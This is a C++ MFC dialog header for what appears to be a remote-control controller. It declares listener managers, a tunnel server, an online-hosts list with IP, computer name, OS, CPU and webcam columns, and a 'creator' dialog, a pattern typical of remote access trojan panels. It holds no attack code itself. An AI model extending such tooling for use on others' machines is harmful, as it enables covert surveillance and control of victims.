
// remote_mfcDlg.h: 头文件
//

#pragma once
#include "PublicStructh.h"
#include "ListenersManager.h"
#include "TunnelHelpServer.h"
class ListenersManager;
class TunnelHelpServer;
// CremotemfcDlg 对话框
class CremotemfcDlg : public CDialogEx
{
// 构造
public:
	CremotemfcDlg(CWnd* pParent = nullptr);	// 标准构造函数
// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_REMOTE_MFC_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
private:
	std::vector<std::shared_ptr<ListenersManager>> m_vecListenersManager;

	std::shared_ptr<TunnelHelpServer> m_pTunnelHelpServer;
	CListCtrl m_CList_Online;
	#define COLUMN_ONLINE_COUNT 7			// 在线列表的个数
	int m_Column_Online_Width = 0;		// 在线列表宽度和
	COLUMNSTRUCT m_Column_Online_Data[COLUMN_ONLINE_COUNT] =
	{
		{"IP",				148	},
		//{"区域",			150	},
		{"電腦名稱/備註",	180	},
		{"操作系統",		158	},
		{"CPU",				80	},
		{"攝影機",			85	},
		{"PING",			85	}
	};

	
	int		InitMyMenu();		// 初始化主页面上方菜单
	int		InitList();			// 初始化list控件信息
	int		InitTab();			// 初始化tab控件信息
public:
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnOpenLisrenersDialog();
	afx_msg void OnCreatorDialog();
	std::shared_ptr<ListenersManager> GetListenersManager();
	CTabCtrl tab;
};
